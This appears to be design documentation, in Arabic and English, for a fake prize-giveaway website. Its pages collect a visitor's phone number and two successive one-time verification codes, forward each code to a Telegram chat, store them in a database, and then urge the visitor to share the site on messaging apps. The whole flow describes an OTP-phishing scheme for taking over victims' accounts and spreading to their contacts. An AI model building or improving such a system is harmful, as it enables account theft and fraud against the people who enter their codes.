# توثيق التدفق - Flow Documentation

## 📱 الواجهات الخمس (5 Screens)

### 1. Landing Page (`/`)
- عرض الجوائز
- عرض قائمة الفائزين (تحديث تلقائي كل 5 ثوان)
- زر "تسجيل الدخول / المشاركة"

### 2. Registration Page (`/register`)
- إدخال رقم الهاتف (8 أرقام)
- إدخال رمز المشاركة (4 أرقام مختلفة)
- **إرسال:** رسالة Telegram أولى

### 3. OTP1 Page (`/otp1`)
- إدخال رمز التحقق الأول (4 أرقام)
- يجب أن يكون مختلف عن Entry Code
- **عند النجاح:** رسالة Telegram ثانية

### 4. OTP2 Page (`/otp2`)
- إدخال رمز التحقق الثاني (4 أرقام)
- يجب أن يكون مختلف عن Entry Code و OTP1
- **عند النجاح:** رسالة Telegram ثالثة (تحتوي على OTP1 و OTP2)

### 5. Share Page (`/share`)
- عرض رسالة نجاح
- أزرار المشاركة (WhatsApp, Messenger, Snapchat)

## 🔄 تدفق العمل (Flow)

```
1. Landing Page
   ↓
2. Registration
   → Telegram Message #1 (تسجيل جديد)
   ↓
3. OTP1
   → Telegram Message #2 (OTP1 ناجح)
   ↓
4. OTP2
   → Telegram Message #3 (OTP1 + OTP2 ناجح)
   ↓
5. Share
```

## ✅ قواعد التحقق

### رقم الهاتف
- 8 أرقام بالضبط
- يبدأ بـ 2 أو 3 أو 4
- Pattern: `^[234][0-9]{7}$`

### رمز المشاركة (Entry Code)
- 4 أرقام بالضبط
- جميع الأرقام مختلفة

### OTP1
- 4 أرقام بالضبط
- **يجب ألا يطابق** Entry Code

### OTP2
- 4 أرقام بالضبط
- **يجب ألا يطابق** Entry Code
- **يجب ألا يطابق** OTP1

---

## ⚠️ معالجة الأخطاء

- **خطأ في التسجيل:** يبقى في صفحة التسجيل
- **خطأ في OTP1:** يعيد إلى صفحة التسجيل
- **خطأ في OTP2:** يعيد إلى صفحة التسجيل

## 📊 قاعدة البيانات

### جدول `participants`
- `phone_number` - رقم الهاتف
- `entry_code` - رمز المشاركة
- `otp1_code` - رمز التحقق الأول
- `otp2_code` - رمز التحقق الثاني
- `verified` - حالة التحقق (true بعد OTP2)
